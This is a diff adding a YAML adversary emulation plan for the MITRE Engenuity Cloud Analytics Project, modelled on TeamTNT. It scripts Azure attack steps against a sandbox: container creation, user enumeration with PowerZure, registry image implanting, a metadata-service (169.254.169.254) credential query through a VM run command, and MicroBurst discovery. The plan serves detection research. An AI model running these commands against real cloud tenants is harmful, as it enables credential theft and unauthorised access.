@@ -1,0 +1,207 @@
+# aep1.yaml - CALDERA and Atomic style TTPs for Cloud Analytics project
+
+- emulation_plan_details:
+    id: ffe6f601-5c08-401b-8f80-417a1be8bd97
+    adversary_name: CAP
+    adversary_description: Adversary CAP, or Cloud Analytics Project, is a simulated adversary created to meet the goals of the MITRE Engenuity Cloud Analytics Project. Adversary behavior was based off of TeamTNT, and augmented with additional TTPs to provide a cloud specific advesary. Requires Azure CLI installation.
+    attack_version: 10.0
+    format_version: 1.0
+
+- id: e6a0bc92-f775-4797-9ea6-554e391c1eba
+  name: Initial Access External Remote Services
+  description: Create container in Azure
+  tactic: Initial
+  technique:
+    attack_id: T1610
+    name: "External Remote Services"
+  cti_source: "https://attack.mitre.org/techniques/T1610/"
+  procedure_group: procedure_initial
+  procedure_step: "1.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          az container create -g 'ca-sandbox' --name psdocker --image mcr.microsoft.com/powershell:latest --cpu 1 --memory 1
+
+  executors:
+  - name: command_prompt
+    command: |
+      az container create -g 'ca-sandbox' --name psdocker --image mcr.microsoft.com/powershell:latest --cpu 1 --memory 1
+
+- id: 8ae65b34-3427-4f64-ad75-490868ffc739
+  name: Initial Access Valid Account
+  description: Credentials leaked via data leak or source code repository
+  tactic: initial-access
+  technique:
+    attack_id: T1078.004
+    name: "Valid Accounts"
+  procedure_group: procedure_access
+  procedure_step: "2.A"
+  platforms:
+    windows:
+      pwsh:
+        command: |
+          Get-AzureUser -All
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Install Powerzure
+      prereq_command: |
+        git clone https://github.com/hausec/PowerZure.git
+        ipmo .\PowerZure
+
+  executors:
+  - name: command_prompt
+    command: |
+      Get-AzureUser -All
+
+
+- id: e3ce8b20-c7dc-48f7-9412-f6a0d7159a9e
+  name: Persistence
+  description: Implant malicious container image into internal or external container registries
+  tactic: Persistence
+  technique:
+    attack_id: T1525
+    name: "Implant Internal Image"
+  procedure_group: procedure_persist
+  procedure_step: "3.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          az acr import -n justsomeregistry --source docker.io/library/hello-world:latest -t targetrepository:targettag
+
+  executors:
+  - name: command_prompt
+    command: |
+      az acr import -n justsomeregistry --source docker.io/library/hello-world:latest -t targetrepository:targettag
+
+- id: 567c748d-e87a-4ebf-85c1-9a9cf1fd62f0
+  name: Spawn container
+  description: Spawn container in cloud env
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1610
+    name: "Defense Evasion - Deploy Container"
+  procedure_group: procedure_execution
+  procedure_step: "4.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          az container create -g 'ca-sandbox' --name psdocker --image justsomeregistry.aurecr.io/targetrepository:targettag --cpu 1 --memory 1
+
+  executors:
+  - name: command_prompt
+    command: |
+      az container create -g 'ca-sandbox' --name psdocker --image justsomeregistry.aurecr.io/targetrepository:targettag --cpu 1 --memory 1
+
+  dependency_executor_name: acr_dependency
+  dependencies:
+    - description: Create ACR if necessary
+      prereq_command: |
+        az group create --name myrg --location eastus
+        az acr create --resource-group myrg --name justsomeregistry --sku Basic
+
+
+- id: fbbd13f9-d129-4737-aa75-70e1391be1d8
+  name: Extract Metadata
+  description: Query metadata service
+  tactic: credential-access
+  technique:
+    attack_id: T1552.005
+    name: "Credential Access - Cloud Instance Metadata API"
+  procedure_group: procedure_credential
+  procedure_step: "5.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          Invoke-AzureRunCommand -VMName ca-linux-vm -Command 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"'
+
+  executors:
+    - name: command_prompt
+      command: |
+        Invoke-AzureRunCommand -VMName ca-linux-vm -Command 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"'
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Install Powerzure
+      prereq_command: |
+        git clone https://github.com/hausec/PowerZure.git
+        ipmo .\PowerZure
+
+- id: e28963a8-8b91-4b57-a554-2b72fc467f75
+  name: Discovery Groups
+  description: Discover groups and resources
+  tactic: discovery
+  technique:
+    attack_id: T1069.003
+    name: "Permission Groups Discovery - Cloud Groups"
+  procedure_group: procedure_discovery
+  procedure_step: "6.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          Get-AzDomainInfo -folder MicroBurst -Verbose
+
+  executors:
+    - name: command_prompt
+      command: |
+        Get-AzDomainInfo -folder MicroBurst -Verbose
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Install Microburst
+      prereq_command: |
+        git clone https://github.com/NetSPI/MicroBurst.git
+        Import-Module .\MicroBurst.psm1
+
+
+- id: bbb0c079-2a95-475c-9509-e23fcc6131b4
+  name: Discovery Container and Resources
+  description: Discover groups and resources
+  tactic: discovery
+  technique:
+    attack_id: T1069.003
+    name: "Permission Groups Discovery - Cloud Groups"
+  procedure_group: procedure_discovery
+  procedure_step: "7.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          Get-AzACR -username "justsomeregistry" -password "xxxxxx" -registry "http://justsomeregistry.azurecr.io"
+
+  executors:
+    - name: command_prompt
+      command: |
+        Get-AzACR -username "justsomeregistry" -password "xxxxxx" -registry "http://justsomeregistry.azurecr.io"
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: Install Microburst
+      prereq_command: |
+        git clone https://github.com/NetSPI/MicroBurst.git
+        Import-Module .\MicroBurst.psm1
+
+
+- id: aa2c4311-5ee2-447e-952e-2c2a6bfb9d6c
+  name: Lateral Movement
+  description: Taint shared content and exfiltration
+  tactic: exfiltrate
+  technique:
+    attack_id: T1080
+    name: "Taint Shared Content"
+  procedure_group: procedure_lateral_movement
+  procedure_step: "8.A"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          az container attach --name publicapp --resource-group ca-sandbox
+
+  executors:
+    - name: command_prompt
+      command: |
+        az container attach --name publicapp --resource-group ca-sandbox
